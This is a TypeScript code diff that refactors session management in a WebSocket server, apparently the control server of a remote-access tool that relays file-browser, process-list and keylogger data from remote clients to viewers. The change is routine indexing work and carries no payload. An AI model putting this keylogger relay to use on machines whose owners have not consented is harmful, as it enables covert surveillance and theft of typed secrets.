@@ -58,7 +58,7 @@ export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.getAllFileBrowserSessions().set(sessionId, session);
+  sessionManager.addFileBrowserSession(session);
   ws.data.sessionId = sessionId;
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientUser: target?.user || "", clientOs: target?.os || "" });
   if (!target) {
@@ -240,8 +240,7 @@ export function handleFileBrowserMessage(clientId: string, payload: any, deps: W
   }
 
   let hasSession = false;
-  for (const session of sessionManager.getAllFileBrowserSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getFileBrowserSessionsByClient(clientId)) {
     if (!hasSession) {
       hasSession = true;
       if (type && type !== "command_result" && type !== "command_progress") {
@@ -265,7 +264,7 @@ export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
-  sessionManager.getAllProcessSessions().set(sessionId, session);
+  sessionManager.addProcessSession(session);
   ws.data.sessionId = sessionId;
   safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
   if (!target) {
@@ -305,8 +304,7 @@ export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw:
 }
 
 export function handleProcessMessage(clientId: string, payload: any) {
-  for (const session of sessionManager.getAllProcessSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getProcessSessionsByClient(clientId)) {
     safeSendViewer(session.viewer, payload);
   }
 }
@@ -371,8 +369,7 @@ export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, ra
 }
 
 export function handleKeyloggerMessage(clientId: string, payload: any) {
-  for (const session of sessionManager.getAllKeyloggerSessions().values()) {
-    if (session.clientId !== clientId) continue;
+  for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
     safeSendViewer(session.viewer, payload);
   }
 }
